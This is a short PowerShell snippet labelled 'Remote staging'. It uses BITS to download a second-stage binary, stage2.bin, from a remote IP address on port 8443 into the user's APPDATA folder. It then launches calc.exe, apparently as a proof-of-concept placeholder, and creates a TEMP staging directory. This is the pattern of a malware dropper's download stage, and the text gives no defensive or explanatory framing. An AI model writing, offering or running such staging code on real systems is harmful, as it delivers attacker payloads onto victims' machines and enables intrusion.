
# Remote staging
$TransferUrl = 'https://198.51.100.118:8443/stage2.bin'
$OutputPath = "$env:APPDATA\stage2.bin"
Start-BitsTransfer -Source $TransferUrl -Destination $OutputPath
Start-Process -FilePath 'calc.exe'
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
